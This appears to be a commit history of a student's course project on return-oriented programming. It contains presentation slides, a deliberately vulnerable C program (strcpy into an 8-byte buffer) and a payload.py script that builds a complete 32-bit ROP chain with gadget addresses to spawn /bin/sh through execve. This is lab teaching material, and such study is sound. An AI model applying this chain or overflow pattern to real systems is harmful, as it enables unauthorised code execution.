### 2022-04-09 ret_oriented_prog.tex
added the basic template

\documentclass[10pt,a4paper,twocolumn]{article}
\usepackage[utf8]{inputenc}
\usepackage[english]{babel}
\usepackage{amsmath}
\usepackage{amsfonts}
\usepackage{amssymb}
\author{Maximilian Heim}
\title{Exploring Return Oriented Programming}
\begin{document}
\maketitle
\section{Abstract}
\section{Introduction}
\section{Conclusion}
\bibliography{bib.bib}
\end{document}

### 2022-06-17 RetOriProg_Maximilian_Heim.tex
changes

\documentclass[11pt]{beamer}
\usetheme{Frankfurt}
\usecolortheme{crane}
\usepackage[utf8]{inputenc}
\usepackage[english]{babel}
\usepackage{amsmath}
\usepackage{amsfonts}
\usepackage{amssymb}
\usepackage{graphicx}
%\usepackage{circuitikz}
\author{Maximilian Heim}
\title{Return Oriented Programming}
%\setbeamercovered{transparent} 
%\setbeamertemplate{navigation symbols}{} 
\logo{\includegraphics[width=1.5cm]{1200px-Hsas_logo.svg.png}}
\institute{University Albstadt-Sigmaringen} 
\date{\today} 
\subject{Offensive Security Methods}
\begin{document}

\begin{frame}
\titlepage
\end{frame}

\begin{frame}
\tableofcontents
\end{frame}

\section{Introduction}
\subsection{Return Oriented Programming}
\begin{frame}
    \frametitle{What is Return Oriented Programming?}
    \begin{enumerate}
    \item A type of buffer overflow attack
    \item Instead of writing executable code onto the stack we place return addresses onto the stack
    \item These get executed sequentially
    \item Using this technique we can have arbitrary code execution in large enough programs
    \end{enumerate}
\end{frame}
\subsection{Relevanz}
\begin{frame}
    \frametitle{Warum ist es wichtig diese zu erkennen?}
    \begin{itemize}
    \item Militär
    \item Finanzen
    \item Energie
    \item Geheimdienste
    \item Überwachungsstaaten
    \item Transport
    \item U.v.m \ldots
    \end{itemize}

\end{frame}

\section{Erkennung}
\subsection{Destruktive Erkennung}
\begin{frame}
    \frametitle{Reverse Engineering}
    \begin{itemize}
        \item Entfernen der Oberfläche Schicht für Schicht
        \item Advantages: 
        \begin{enumerate}
            \item 100 \% detection rate
        \end{enumerate}
        \item Disadvantages:
        \begin{enumerate}
            \item Only tests a single chip
            \item Chip unusable afterwards
            \item Very time consuming
        \end{enumerate}
        \item However, 
    \end{itemize}
\end{frame}
\subsection{Nicht-Destruktive Erkennung}
\section{Conclusion}
\begin{frame}
    \frametitle{Types of detection}
\end{frame}

\end{document}

### 2022-06-17 ret_oriented_prog.tex
changes

@@
-\documentclass[10pt,a4paper,twocolumn]{article}
+% IACR Transactions CLASS DOCUMENTATION -- version 0.24 (26 August 2016)
+% Written by Gaetan Leurent gaetan.leurent@inria.fr (2016)
+%
+% To the extent possible under law, the author(s) have dedicated all
+% copyright and related and neighboring rights to this software to the
+% public domain worldwide. This software is distributed without any
+% warranty.
+%
+% You should have received a copy of the CC0 Public Domain Dedication
+% along with this software. If not, see
+% <http://creativecommons.org/publicdomain/zero/1.0/>.
+
+\documentclass[preprint]{iacrtrans}
 \usepackage[utf8]{inputenc}
-\usepackage[english]{babel}
-\usepackage{amsmath}
-\usepackage{amsfonts}
-\usepackage{amssymb}
+
 \author{Maximilian Heim}
-\title{Exploring Return Oriented Programming}
+\institute{University Albstadt-Sigmaringen, Gemrany, \email{heimmaxi@hs-albsig.de}}
+\title[\texttt{iacrtans} Return Oriented Programming]{\publname}
+\subtitle{\LaTeX{} Applications \and predictions}
+
 \begin{document}
+
 \maketitle
-\section{Abstract}
-\section{Introduction}
-\section{Conclusion}
-\bibliography{bib.bib}
+
+% use optional argument because the \LaTeX command breaks the PDF keywords
+\keywords[\publname, TCHES, LaTeX]{\publname \and TCHES \and \LaTeX}
+
+\begin{abstract}
+  This document is a quick introduction to the \LaTeX{} class for the
+  \publname{}.
+\end{abstract}
+
+\section*{Introduction}
+
+The \texttt{iacrtans} \LaTeX{} class will be used by the new
+``\publname'' journal.  The class is based on standard \LaTeX{}
+classes and packages (mainly the \texttt{article} class with
+\texttt{amsmath}), and should be similar in use to the \texttt{llncs}
+class used for Springer's proceedings.  The \LaTeX{} source of this
+documentation is meant as an example to show basic usage of the class.
+
+Since we are now preparing the zero-th issue of the journal, the class
+is still in development and feedback and comments are welcome.
+
+\subsection*{\textcolor{red!70!black}{FAQ:} Converting \texttt{llncs} papers to \texttt{iacrtrans}}
+
+If you have a paper typeset with the \texttt{llncs} class, conversion
+should be relatively easy.  The following steps should be sufficient
+in most cases (for the submission version):
+\begin{enumerate}
+\item Replace \verb+\documentclass{llncs}+ with\\ \verb+\documentclass[submission,spthm]{iacrtrans}+;
+\item Replace \verb+\bibliographystyle{splncs03}+ with
+  \verb+\bibliographystyle{alpha}+;
+\item Add a \verb+\keywords{}+ command before the abstract, with
+  keywords separated by \verb+\and+;
+\item Remove commands that might override the class style, such as
+  \verb+\pagestyle{...}+ or \verb+\thispagestyle{...}+,
+  change of margins (\emph{e.g.}  with the \texttt{geometry} package),
+  change of fonts, ....
+\item See also \autoref{sec:biblio} for information about how to
+  typeset the bibliography.
+\end{enumerate}
+
+\section{Main Commands}
+
+\subsection{Title page}
+
+The following commands are used to input informations for the title page.
+
+\paragraph{\texttt{\textbackslash title}} to define the title.
+
+A shorter running title can be given as optional argument.
+
+\paragraph{\texttt{\textbackslash subtitle}} to give an optional
+subtitle.
+
+\paragraph{\texttt{\textbackslash author}} to define the author list.
+
+Author names must be delimited by \verb+\and+ macros.  If there is one
+different affiliation for each author, authors and affiliations will be
+numbered automatically.  Otherwise, each author name must be followed by
+\verb+\inst{...}+ with the corresponding affiliation(s).
+
+A shorter list of authors for the running head can be given as
+optional argument.
+
+\paragraph{\texttt{\textbackslash institute}} to give author's affiliation(s).
+
+If there are several affiliations, they must be separated by
+\verb+\and+ macros, and will be numbered automatically.
+
+\paragraph{\texttt{\textbackslash keywords}} to give a list of
+keywords.
+
+Individual keywords should be separated by the \verb+\and+ macro.
+
+If there are fragile commands in the keywords, use the optional argument
+to give a text-only version of the keywords; this will be used for the
+PDF meta-data.
+
+\paragraph{\texttt{\textbackslash email}} should be used inside the
+\verb+\institute+ argument to typeset author's email address(es).  An
+optional argument can be given for the hyperlink, if different from the
+displayed email.  For instance, you can group emails as follows:\\
+\verb+\email[alice@foo.com,bob@bob.com]{{alice,bob}@foo.com}+
+
+\paragraph{\texttt{\textbackslash thanks}}
+can be used inside the \verb+\title+,
+\verb+\author+ or \verb+\institute+ argument to generate a footnote with additional
+information, if needed.
+
+\paragraph{\texttt{\textbackslash maketitle}} is used to actually
+typeset the title.
+
+\paragraph{The \texttt{abstract} environment} should be used to typeset the abstract.
+
+Note that the keywords should be given before starting the abstract environment.
+
+\subsection{Theorems}
+
+The \texttt{iacrtrans} class uses the \AmS{} packages to typeset
+math.  In particular, it loads the \texttt{amsthm} package, and
+predefines the following environments:
+\begin{center}
+  \ttfamily
+\begin{tabular}{l@{\hspace{1cm}}l@{\hspace{1cm}}l}
+theorem     & definition & remark \\
+proposition & example    & note   \\
+problem     & exercise   & case   \\
+lemma       & property   &        \\
+conjecture  & question   &        \\
+corollary   & solution   &        \\
+claim       &            &        \\
+\end{tabular}
+\end{center}
+
+Note that the \texttt{proof} environment automatically adds a QED
+symbol at the end of the proof (unless you give option
+\texttt{[spthm]} to the \texttt{iacrtrans} class).  If the QED symbol
+is typeset at a wrong position, you can force its position with
+\verb+\qedhere+.
+
+\section{Class options}
+\label{sec:options}
+
+\subsection{Publication type}
+
+The class supports four publication types, selected with the
+following class options:
+
+\begin{description}
+\item[\texttt{[final]}] for final papers (default mode)
+\item[\texttt{[preprint]}] for preprints (without copyright info)
+\item[\texttt{[submission]}] for submissions (anonymous, with line numbers)
+\item[\texttt{[draft]}] is similar to preprint, but activates draft
+  mode for the underlying \texttt{article} class (which shows overfull hboxes), and other packages
+  (\emph{e.g.} \texttt{graphicx}, \texttt{hyperref}).
+\end{description}
+
+\subsection{Other Options}
+
+\paragraph{\texttt{[spthm]}}
+provides theorem environments that emulates
+\texttt{llncs} class's \texttt{sptheorem}:
+\begin{itemize}
+\item A \texttt{\textbackslash spnewtheorem} wrapper is provided
+  around \AmS{} \texttt{\textbackslash newtheorem}.  Note that the
+  styling options are ignored; you should use standard
+  \texttt{amsthm} commands for fine control.
+\item The \AmS{} \texttt{proof} environment will not automatically add a
+  QED symbol at the end of the proof.
+\end{itemize}
+
+\paragraph{\texttt{[floatrow]}}
+uses the \texttt{floatrow} package to customize floats rather than the
+plain \texttt{float} package.  In particular, this allows to typeset
+floats side by side as shown in this example:
+\begin{verbatim}
+\documentclass[floatrow]{iacrtrans}
+\usepackage[demo]{graphicx}
+\begin{document}
+
+\begin{figure}
+  \begin{floatrow}
+    \ffigbox{\includegraphics[width=0.4\textwidth]{1.png}}
+    {\caption{This is caption 1.}}
+    \ffigbox{\includegraphics[width=0.4\textwidth]{2.png}}
+    {\caption{This is caption 2.}}
+  \end{floatrow}
+\end{figure}
+
 \end{document}
+\end{verbatim}
+
+The row will be divided equally according to the number of figures, but
+you can ask each figure to take its natural space instead with
+\verb+\ffigbox[\FBwidth]+.  For more advanced use, see the
+\texttt{floatrow} documentation.
+
+\paragraph{\texttt{[nohyperref]}}
+disables the automatic loading of
+\texttt{hyperref}.  Use this is if your document fails to compile with
+\texttt{hyperref} for some reason.
+
+The \texttt{iacrtrans} class automatically loads \texttt{hyperref}
+after all other packages.  If you need some packages to be loaded
+\emph{after} \texttt{hyperref}, you should load \texttt{hyperref}
+explicitly at the correct position, but not use the \texttt{[nohyperref]} option.
+
+\section{Typesetting the Bibliography}
+\label{sec:biblio}
+
+% Borrowed from btxdoc.tex
+\def\BibTeX{{\rm B\kern-.05em{\sc i\kern-.025em b}\kern-.08em
+    T\kern-.1667em\lower.7ex\hbox{E}\kern-.125emX}}
+
+Having good bibliographic references is very important for the
+visibility of the journal.  Since we don't have a commercial editor,
+authors need to make sure themselves that references are standardized
+and clean.  We strongly encourage authors to use \BibTeX{} for the
+bibliograpy, using bibliographic data
+from \url{http://www.dblp.org} or \url{https://cryptobib.di.ens.fr/}.
+
+We are still working on a good solution for the bibliography, and we
+expect to have more specific instructions when producing the final
+version of the papers, including a dedicated \BibTeX{} style.
+
+\section{Further instructions}
+
+\paragraph{\LaTeX{} distribution, and worklow.}  \LaTeX{}
+distributions are available on a variaty of platforms.  In particular,
+we recommand the \href{https://www.tug.org/texlive/}{TeX Live}
+distribution, which is updated regularly, include a large number of
+packages, and is available on many platforms.
+\begin{description}
+\item[Linux:] A LaTeX installation is included in most Linux
+  distributions.  Alternatively,
+  \href{https://www.tug.org/texlive/}{TeX Live} can be installed
+  easily without root access.
+\item[Windows:] There are also good \LaTeX{} distributions for Windows,
+  such as \href{http://www.miktex.org/}{MikTeX} and
+  \href{https://www.tug.org/texlive/}{TeX Live}.
+\item[MacOSX:] On MacOSX, TeX Live is available inside
+  \href{http://www.tug.org/mactex/}{MacTeX}.
+\end{description}
+
+We recommand the use of \texttt{pdflatex} because it generally
+supports more features than \texttt{latex} and \texttt{dvips}
+(\texttt{xelatex} and \texttt{lualatex} are also missing some advanced
+features from \texttt{pdflatex}).
+
+\paragraph{Internal references.}
+
+We recommend the use of \verb+\autoref+ from \texttt{hyperref}
+(automatically loaded by the class).  For instance,
+\verb+\autoref{sec:options}+ links to \autoref{sec:options}.
+
+\paragraph{Pictures.}
+
+We recommend the use of the \texttt{tikz} package to render pictures.
+
+In particular, a large variety of crypto pictures made with
+\texttt{tikz} is available at \url{http://www.iacr.org/authors/tikz/}.
+
+\paragraph{External pictures.}  The \texttt{graphicx} is loaded by the
+class, and is recommended for external figures.
+
+If possible, external figures should be in a vector format: you can
+use PDF files when compiling with \texttt{pdflatex}, and EPS files
+when compiling with \texttt{latex}, and \texttt{dvips}.  Note that the
+\verb+\includegraphics+ command will automatically select a file with
+the right extension, so if you write \verb+\includegraphics{figure}+
+and have two files \texttt{figure.pdf} and \texttt{figure.eps}, it
+should work with both workflow.
+
+\paragraph{Floats.}
+
+Figure captions should be below the figures, and table captions above
+the tables.  The \texttt{float} package loaded by the class should
+take care of this automatically.  If want to have several figures side
+by side, see the \texttt{[floatrow]} option.
+
+\paragraph{Tables.}
+
+We recommend the \texttt{booktabs} package to typeset tables.
+
+\paragraph{Algorithms.}
+
+We recommend the \texttt{algorithm}, \texttt{algorithmcx} packages for
+algorithms (in particular, \texttt{algpseudocode} for pseudo-code).
+
+\section{For the Editor}
+
+The following commands should be used by the editor to prepare the final
+version:
+
+\paragraph{\texttt{\textbackslash setfirstpage}} to set the first page number.
+
+\paragraph{\texttt{\textbackslash setlastpage}} to set the first page
+number (optional).
+
+\paragraph{\texttt{\textbackslash setvolume}} to set the volume number.
+
+\paragraph{\texttt{\textbackslash setnumber}} to set the edition number.
+
+\paragraph{\texttt{\textbackslash setDOI}} to set the DOI.
+
+\section{Further information}
+
+More general information can be found in the following documents:
+\begin{itemize}
+\item General \LaTeX{} documentation, such as the
+  \href{http://mirrors.ctan.org/info/lshort/english/lshort.pdf}{(not
+    so) short introduction to \LaTeXe};
+% \item The \texttt{article} class
+%   \href{http://mirrors.ctan.org/macros/latex/doc/clsguide.pdf}{documentation};
+\item The \AmS-\LaTeX{}
+  \href{http://mirrors.ctan.org/macros/latex/required/amslatex/math/amsldoc.pdf}{documentation}
+  and \texttt{amsthm} \href{ftp://ftp.ams.org/pub/tex/doc/amscls/amsthdoc.pdf}{documentation};
+\item Documentation of the \LaTeX{} packages used in the class (see below).
+\end{itemize}
+
+\subsection{Packages used}
+
+The class is based on the standard \texttt{article} class, and loads
+the following packages:
+\begin{itemize}
+\item \texttt{geometry}, \texttt{secsty}, \texttt{fancyhdr}, \texttt{mathtools},
+  \texttt{float}, \texttt{microtype}, \texttt{lastpage}
+\item \texttt{amsmath}, \texttt{amssymb}, \texttt{amsthm}
+\item \texttt{graphicx}
+\item \texttt{hyperref}, \texttt{hyperxmp}, \texttt{etoolbox}, \texttt{xcolor} (unless
+  the \texttt{[nohyperref]} option is used)
+\item \texttt{lineno} (in \texttt{[submission]} mode)
+\item \texttt{floatrow,caption} (with option \texttt{[floatrow]})
+\end{itemize}
+
+\section*{Thanks}
+
+We would like to thank people who helped design and improve the
+class:
+Anne Canteaut,
+Jérémy Jean,
+Bart Preneel,
+Christian Rechberger,
+Tyge Tiessen,
+Friedrich Wiemer.
+
+\section*{Changes}
+
+\begin{description}
+\item[v 0.21] First public version
+\item[v 0.22] Added documentations.  Minor tweaks in the class.
+\item[v 0.23] More documentation.  Removed some extra line-numbers
+  with AMS environments in submission mode.  Make \verb+autoref+
+  capitalize sections.  Table caption are now above tables.  Rewritten
+  running authors and running title.  Added PDF info (title, author,
+  keyword).  Optional argument for \verb+\email+.  Added
+  \texttt{floatrow} option.
+\item[v 0.24] Added CC licence text, and added XMP metadata.  Fixed some
+  metadata transformations.
+\end{description}
+
+\end{document}

### 2022-06-17 test.c
changes

@@ -1,0 +1,9 @@
+#include <stdio.h>
+void hello() {
+	printf("Hello World!");
+	return;
+}
+int main() {
+	hello();
+	return 0;
+}

### 2022-06-19 RetOriProg_Maximilian_Heim.tex
changes

@@
 \usepackage{graphicx}
+\usepackage{fancyvrb}
 %\usepackage{circuitikz}
@@
 %\setbeamertemplate{navigation symbols}{} 
-\logo{\includegraphics[width=1.5cm]{1200px-Hsas_logo.svg.png}}
+\logo{\includegraphics[width=0.1\textwidth]{logo.png}}
 \institute{University Albstadt-Sigmaringen} 
@@
     \frametitle{What is Return Oriented Programming?}
+    \begin{itemize}
+    \item A type attack that exploits buffer overruns
+    \item Published by Hovav Shacham in 2007
+    \item Arised as a technique to counter security mechanisms (NX)
+    \item Big binary $\rightarrow$ ROP is turing complete
+    \item Many authors refer to ret-to-libc as ROP
+    \end{itemize}
+\end{frame}
+
+\section{How does it work?}
+\begin{frame}
+    \frametitle{Overview}
     \begin{enumerate}
-    \item A type of buffer overflow attack
-    \item Instead of writing executable code onto the stack we place return addresses onto the stack
-    \item These get executed sequentially
-    \item Using this technique we can have arbitrary code execution in large enough programs
+        \item Search the binary for gadgets: return (0xC3) bytes that contain useful instructions before
+        \item Generate a list of these gadgets, called ROP chain
+        \item Generate a payload with the addresses of these gadgets
+        \item Insert payload via buffer overrun
     \end{enumerate}
 \end{frame}
-\subsection{Relevanz}
 \begin{frame}
-    \frametitle{Warum ist es wichtig diese zu erkennen?}
+    \frametitle{ROP gadgets}
     \begin{itemize}
-    \item Militär
-    \item Finanzen
-    \item Energie
-    \item Geheimdienste
-    \item Überwachungsstaaten
-    \item Transport
-    \item U.v.m \ldots
+        \item Gadgets are machine instructions that end on a return
+        \item Tools: ROPgadget (\url{https://github.com/JonathanSalwan/ROPgadget}), ropper (\url{https://github.com/sashs/Ropper}), Radare2, pwntools....
     \end{itemize}
+    \begin{figure}[h]
+        \caption{ROP Gadgets}
+        \centering
+        \includegraphics[width=0.8\textwidth]{gadget.png}\label{gadget}
+    \end{figure}
 
@@
 
-\section{Erkennung}
-\subsection{Destruktive Erkennung}
+\begin{frame}[fragile]
+    \frametitle{Useful gadgets: Write to register}
+    \begin{itemize}
+        \item Especially useful are pop instructions
+    \end{itemize}
+    \begin{Verbatim}
+        POP eax, ret;
+    \end{Verbatim}
+    \begin{itemize}
+        \item These allow us to write arbitrary values into registers
+        \item However, sometimes we do not find a pop into our desired register (e.g. r14), here we can improvise and use something like
+    \end{itemize}
+    \begin{Verbatim}
+        xor r14, r14
+        pop r12
+        xor r14, r12
+    \end{Verbatim}
+\end{frame}
+
 \begin{frame}
-    \frametitle{Reverse Engineering}
-    \begin{itemize}
-        \item Entfernen der Oberfläche Schicht für Schicht
-        \item Advantages: 
-        \begin{enumerate}
-            \item 100 \% detection rate
-        \end{enumerate}
-        \item Disadvantages:
-        \begin{enumerate}
-            \item Only tests a single chip
-            \item Chip unusable afterwards
-            \item Very time consuming
-        \end{enumerate}
-        \item However, 
-    \end{itemize}
-\end{frame}
-\subsection{Nicht-Destruktive Erkennung}
-\section{Conclusion}
-\begin{frame}
-    \frametitle{Types of detection}
+    \frametitle{References}
+    \url{https://trustfoundry.net/basic-rop-techniques-and-tricks/}
+
 \end{frame}

### 2022-06-19 RetOriProg_Maximilian_Heim.tex
changes

@@
 \usepackage{graphicx}
+\usepackage{blt}
+\usepackage{listings}
 \usepackage{fancyvrb}
@@
 \section{Introduction}
-\subsection{Return Oriented Programming}
 \begin{frame}
@@
     \item Big binary $\rightarrow$ ROP is turing complete
-    \item Many authors refer to ret-to-libc as ROP
+    \item Many authors refer to ret-to-libc/library as ROP, according to the founder of this technique it has to be differentiated and ROP describes chaining of small code segments
     \end{itemize}
@@
 \section{How does it work?}
+\subsection{Overview}
 \begin{frame}
@@
 \end{frame}
+\subsection{ROP gadgets}
 \begin{frame}
@@
     \begin{Verbatim}
-        POP eax, ret;
+        POP eax; ret;
     \end{Verbatim}
@@
     \begin{Verbatim}
-        xor r14, r14
-        pop r12
-        xor r14, r12
+        XOR r14, r14; pop r12; XOR r14, r12; ret;
     \end{Verbatim}
@@
 
+\begin{frame}[fragile]
+    \frametitle{Useful gadgets: Load/Read from memory}
+    \begin{itemize}
+        \item Load instructions are also really useful
+    \end{itemize}
+    \begin{Verbatim}
+        mov [rax], rxc; ret;
+    \end{Verbatim}
+    \begin{itemize}
+        \item allows us to write into memory
+    \end{itemize}
+    \begin{Verbatim}
+        mov rax, [rxc]; ret;
+    \end{Verbatim}
+    \begin{itemize}
+        \item allows us to read a value from memory into a register
+        \item Combined with pop this is very powerful
+    \end{itemize}
+\end{frame}
+\begin{frame}[fragile]
+    \frametitle{Useful gadgets: Arithmetics}
+    \begin{itemize}
+        \item add, sub, div, xor, mul, div\ldots allow us to manipulate register contents. Again, in combination with pop we can manipulate the program state significantly
+    \end{itemize}
+\end{frame}
+\begin{frame}[fragile]
+    \frametitle{Useful gadgets: Systemcalls}
+    \begin{itemize}
+        \item Since programs run in userspace we have limited privileges, if we can find systemcalls we can, in combination with the arithmetic operations and pop instructions call arbitrary system calls if we can find
+    \end{itemize}
+    \begin{Verbatim}
+        int 0x80; ret;
+    \end{Verbatim}
+\end{frame}
+\subsection{ROP chain}
 \begin{frame}
-    \frametitle{References}
+    \frametitle{ROP chain with parameters}
+    \begin{figure}[h]
+        \caption{ROP Chain with parameter}
+        \centering
+        \includegraphics[width=0.18\textwidth]{gadgetstack.png}\label{gadget2}
+    \end{figure}
+\end{frame}
+
+\section{Example}
+\begin{frame}[fragile]
+    \frametitle{Working example: Target Program and compilation}
+    \begin{itemize}
+        \item We compile the following program with stack protectors turned off
+    \end{itemize}
+    %\begin{lstlisting}[breaklines, style=commandline]
+%clang -o vuln vuln.c -m32 -fno-stack-protector  -Wl,-z,relro,-z,now,-z,noexecstack -static
+    %\end{lstlisting}
+    \begin{lstlisting}[style=code, language=c]
+#include <stdio.h>
+#include <string.h>
+int main(int argc, char *argv[])
+{
+    char buffer[8] = {0};
+    if(argc != 2)
+    {
+        printf("A single argument is required.\n");
+        return 1;
+    }
+    strcpy(buffer, argv[1]);
+    return 0;
+}
+    \end{lstlisting}
+\end{frame}
+\begin{frame}
+    \frametitle{Working example: Finding gadgets}
+    \begin{itemize}
+        \item Using ropper we can find our desired gadgets
+        \item Lets say we want to execute a shell using execve, for that we need to accomplish the following goals
+        \begin{enumerate}
+            \item write /bin/sh into memory (at the data segment)
+            \item init systemcall number (11)
+            \item init systemcall argument (address of /bin//sh)
+            \item call systemcall
+        \end{enumerate}
+    \end{itemize}
+\end{frame}
+\begin{frame}[fragile]
+    \frametitle{Working example: Putting it together, writing /bin}
+    \begin{lstlisting}[style=code, language=python]
+from struct import pack
+
+p = 'AAAABBBBCCCC'
+p += pack('<I', 0x080958b5) # pop edx; xor eax, eax; pop edi; ret;
+p += pack('<I', 0x080f0f6c) # @ .data
+p += pack('<I', 0x00000000) # @ NULL
+p += pack('<I', 0x080b526a) # pop eax ; ret
+p += '/bin'
+p += pack('<I', 0x08059402) # mov dword ptr [edx], eax ; ret
+    \end{lstlisting}
+\end{frame}
+
+\begin{frame}[fragile]
+    \frametitle{Working example: Putting it together, writing //sh}
+    \begin{lstlisting}[style=code, language=python]
+p += pack('<I', 0x080958b5) # pop edx; xor eax, eax; pop edi; ret;
+p += pack('<I', 0x080f0f70) # @ .data + 4
+p += pack('<I', 0x00000000) # @ NULL
+p += pack('<I', 0x080b526a) # pop eax ; ret
+p += '//sh'
+p += pack('<I', 0x08059402) # mov dword ptr [edx], eax ; ret
+    \end{lstlisting}
+\end{frame}
+
+\begin{frame}[fragile]
+    \frametitle{Working example: Putting it together, init params}
+    \begin{lstlisting}[style=code, language=python]
+# write null byte after /bin/sh
+p += pack('<I', 0x080958b5) # pop edx; xor eax, eax; pop edi; ret;
+p += pack('<I', 0x080f0f74) # @ .data + 8
+p += pack('<I', 0x00000000) # @ NULL
+p += pack('<I', 0x080506c0) # xor eax, eax ; ret
+p += pack('<I', 0x08059402) # mov dword ptr [edx], eax ; ret
+# write address of /bin/sh to ebx
+p += pack('<I', 0x08049022) # pop ebx ; ret
+p += pack('<I', 0x080f0f6c) # @ .data
+# arguments and environment to ecx,edx
+p += pack('<I', 0x0805e64f) # pop ecx; add al, 0xf6; ret;
+p += pack('<I', 0x080f0f74) # @ .data + 8
+p += pack('<I', 0x080958b5) # pop edx; xor eax, eax; pop edi; ret;
+p += pack('<I', 0x080f0f74) # @ .data + 8
+p += pack('<I', 0x00000000) # @ NULL
+    \end{lstlisting}
+\end{frame}
+
+\begin{frame}[fragile]
+    \frametitle{Working example: Putting it together, init params, syscall}
+    \begin{lstlisting}[style=code, language=python]
+p += pack('<I', 0x080506c0) # xor eax, eax ; ret
+p += pack('<I', 0x08082a9e) # inc eax ; ret
+p += pack('<I', 0x08082a9e) # inc eax ; ret
+p += pack('<I', 0x08082a9e) # inc eax ; ret
+p += pack('<I', 0x08082a9e) # inc eax ; ret
+p += pack('<I', 0x08082a9e) # inc eax ; ret
+p += pack('<I', 0x08082a9e) # inc eax ; ret
+p += pack('<I', 0x08082a9e) # inc eax ; ret
+p += pack('<I', 0x08082a9e) # inc eax ; ret
+p += pack('<I', 0x08082a9e) # inc eax ; ret
+p += pack('<I', 0x08082a9e) # inc eax ; ret
+p += pack('<I', 0x08082a9e) # inc eax ; ret
+p += pack('<I', 0x08049b2a) # int 0x80
+print p
+    \end{lstlisting}
+\end{frame}
+\section{Conclusion}
+\begin{frame}
+    \frametitle{Conclusion}
+    \begin{itemize}
+        \item Return Oriented Programming is a very powerful technique to exploit buffer overruns
+        \item It is able to execute any system call if there are enough rop gadgets
+        \item There are many tools to simplify the process of finding ROP gadgets and generatating ROP payloads
+        \item Since modern desktop systems use ASLR it is hard to use this technique
+    \end{itemize}
+\end{frame}
+
+\section{Sources}
+\begin{frame}
+    \frametitle{Sources}
     \url{https://trustfoundry.net/basic-rop-techniques-and-tricks/}
-
+    \url{http://gauss.ececs.uc.edu/Courses/c6056/pdf/rop.pdf}
+    \url{https://www.proggen.org/doku.php?id=security:memory-corruption:exploitation:rop}
+    \url{https://shell-storm.org/talks/ROP_course_lecture_jonathan_salwan_2014.pdf}
 \end{frame}

### 2022-06-19 payload.py

@@ -1,0 +1,43 @@
+from struct import pack
+ 
+# Padding goes here
+p = 'AAAABBBBCCCC'
+ 
+p += pack('<I', 0x080958b5) # pop edx; xor eax, eax; pop edi; ret;
+p += pack('<I', 0x080f0f6c) # @ .data
+p += pack('<I', 0x00000000) # @ NULL
+p += pack('<I', 0x080b526a) # pop eax ; ret
+p += '/bin'
+p += pack('<I', 0x08059402) # mov dword ptr [edx], eax ; ret
+p += pack('<I', 0x080958b5) # pop edx; xor eax, eax; pop edi; ret;
+p += pack('<I', 0x080f0f70) # @ .data + 4
+p += pack('<I', 0x00000000) # @ NULL
+p += pack('<I', 0x080b526a) # pop eax ; ret
+p += '//sh'
+p += pack('<I', 0x08059402) # mov dword ptr [edx], eax ; ret
+p += pack('<I', 0x080958b5) # pop edx; xor eax, eax; pop edi; ret;
+p += pack('<I', 0x080f0f74) # @ .data + 8
+p += pack('<I', 0x00000000) # @ NULL
+p += pack('<I', 0x080506c0) # xor eax, eax ; ret
+p += pack('<I', 0x08059402) # mov dword ptr [edx], eax ; ret
+p += pack('<I', 0x08049022) # pop ebx ; ret
+p += pack('<I', 0x080f0f6c) # @ .data
+p += pack('<I', 0x0805e64f) # pop ecx; add al, 0xf6; ret;
+p += pack('<I', 0x080f0f74) # @ .data + 8
+p += pack('<I', 0x080958b5) # pop edx; xor eax, eax; pop edi; ret;
+p += pack('<I', 0x080f0f74) # @ .data + 8
+p += pack('<I', 0x00000000) # @ NULL
+p += pack('<I', 0x080506c0) # xor eax, eax ; ret
+p += pack('<I', 0x08082a9e) # inc eax ; ret
+p += pack('<I', 0x08082a9e) # inc eax ; ret
+p += pack('<I', 0x08082a9e) # inc eax ; ret
+p += pack('<I', 0x08082a9e) # inc eax ; ret
+p += pack('<I', 0x08082a9e) # inc eax ; ret
+p += pack('<I', 0x08082a9e) # inc eax ; ret
+p += pack('<I', 0x08082a9e) # inc eax ; ret
[…]

### 2022-06-19 vuln.c

@@ -1,0 +1,19 @@
+#include <stdio.h>
+#include <string.h>
+#include <threads.h>
+#include <mqueue.h>
+
+ 
+int main(int argc, char *argv[])
+{
+    char buffer[8] = {0};
+ 
+    if(argc != 2)
+    {
+        printf("A single argument is required.\n");
+        return 1;
+    }
+ 
+    strcpy(buffer, argv[1]);
+    return 0;
+}

### 2022-06-20 RetOriProg_Maximilian_Heim.tex
changes

@@
 \end{frame}
+
 \begin{frame}[fragile]
-    \frametitle{Useful gadgets: Arithmetics}
+    \frametitle{Useful gadgets: Systemcalls, arithmetics}
     \begin{itemize}
-        \item add, sub, div, xor, mul, div\ldots allow us to manipulate register contents. Again, in combination with pop we can manipulate the program state significantly
-    \end{itemize}
-\end{frame}
-\begin{frame}[fragile]
-    \frametitle{Useful gadgets: Systemcalls}
-    \begin{itemize}
-        \item Since programs run in userspace we have limited privileges, if we can find systemcalls we can, in combination with the arithmetic operations and pop instructions call arbitrary system calls if we can find
+        \item add, sub, div, xor, mul, div\ldots allow us to manipulate register contents.
+        \item Since programs run in userspace we have limited privileges, if we can find systemcalls we can, in combination with the arithmetic operations and pop instructions call arbitrary system calls
     \end{itemize}
@@
     \begin{itemize}
-        \item Return Oriented Programming is a very powerful technique to exploit buffer overruns
+        \item Return Oriented Programming is a very powerful
         \item It is able to execute any system call if there are enough rop gadgets
         \item There are many tools to simplify the process of finding ROP gadgets and generatating ROP payloads
-        \item Since modern desktop systems use ASLR it is hard to use this technique
+        \item Modern desktops use aslr and other protection mechanisms $\rightarrow$ practically impossible to use ROP
     \end{itemize}

### 2022-06-20 RetOriProg_Maximilian_Heim.tex
changes

@@
 \subject{Offensive Security Methods}
+\AtBeginSection[]
+{
+    \begin{frame}
+        \frametitle{Table of Contents}
+        \tableofcontents[currentsection]
+    \end{frame}
+}
 \begin{document}
@@
 
-\begin{frame}
+\begin{frame}{Outline}
 \tableofcontents
@@
 \section{Introduction}
+\subsection{Basic information}
 \begin{frame}
@@
     \begin{itemize}
-        \item Load instructions are also really useful
+        \item Move instructions are also really useful
     \end{itemize}
@@
     \begin{itemize}
-        \item add, sub, div, xor, mul, div\ldots allow us to manipulate register contents.
+        \item add, sub, div, xor, mul, div\ldots allow us to manipulate register contents
         \item Since programs run in userspace we have limited privileges, if we can find systemcalls we can, in combination with the arithmetic operations and pop instructions call arbitrary system calls
@@
 
-\section{Example}
+\section{Example: Open a shell}
+\subsection{Target Program}
 \begin{frame}[fragile]
-    \frametitle{Working example: Target Program and compilation}
+    \frametitle{Target Program and compilation}
     \begin{itemize}
@@
 \end{frame}
+\subsection{General approach}
 \begin{frame}
-    \frametitle{Working example: Finding gadgets}
+    \frametitle{Spawning a shell: Approach}
     \begin{itemize}
@@
